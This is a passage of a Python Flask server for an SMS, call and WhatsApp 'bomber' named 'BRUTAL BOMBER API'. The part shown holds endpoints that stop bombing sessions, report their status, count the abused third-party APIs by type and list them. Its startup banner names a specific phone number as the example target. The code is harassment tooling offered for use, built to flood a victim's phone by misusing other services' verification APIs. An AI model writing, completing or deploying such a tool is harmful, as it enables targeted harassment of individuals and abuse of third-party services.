    """Stop bombing a phone number"""
    if phone in active_sessions:
        active_sessions[phone] = False
        return jsonify({
            "status": "stopped",
            "message": f"Bombing stopped for {phone}",
            "stats": session_stats.get(phone, {})
        })
    else:
        return jsonify({
            "status": "not_running",
            "message": f"No active bombing session for {phone}"
        })

@app.route('/status/<phone>', methods=['GET'])
def status(phone):
    """Check bombing status"""
    if phone in active_sessions:
        return jsonify({
            "status": "running",
            "phone": phone,
            "stats": session_stats.get(phone, {})
        })
    elif phone in session_stats:
        return jsonify({
            "status": "completed",
            "phone": phone,
            "stats": session_stats.get(phone, {})
        })
    else:
        return jsonify({
            "status": "not_found",
            "message": f"No session found for {phone}"
        })

@app.route('/stats', methods=['GET'])
def global_stats():
    """Get global statistics"""
    total_apis = len(WORKING_APIS)
    
    # Count API types
    sms = len([a for a in WORKING_APIS if "sms" in a.get("name", "").lower()])
    call = len([a for a in WORKING_APIS if "call" in a.get("name", "").lower() or "voice" in a.get("name", "").lower()])
    whatsapp = len([a for a in WORKING_APIS if "whatsapp" in a.get("name", "").lower()])
    
    return jsonify({
        "total_apis": total_apis,
        "sms_apis": sms,
        "call_apis": call,
        "whatsapp_apis": whatsapp,
        "active_sessions": len(active_sessions),
        "sessions": list(active_sessions.keys())
    })

@app.route('/apis', methods=['GET'])
def list_apis():
    """List all APIs"""
    return jsonify({
        "total": len(WORKING_APIS),
        "apis": [{"name": a["name"], "method": a["method"], "url": a["url"]} for a in WORKING_APIS]
    })

# ======================================================================
# MAIN
# ======================================================================

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    
    print("=" * 60)
    print("💣 BRUTAL BOMBER API")
    print("=" * 60)
    print(f"📊 Total APIs: {len(WORKING_APIS)}")
    print(f"🌐 Server: http://0.0.0.0:{port}")
    print("=" * 60)
    print("\n📌 Endpoints:")
    print("  GET /bomb/8905324917  - Start bombing")
    print("  GET /stop/8905324917   - Stop bombing")
    print("  GET /status/8905324917 - Check status")
    print("  GET /stats             - Global stats")
    print("  GET /apis              - List all APIs")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=port, debug=False)
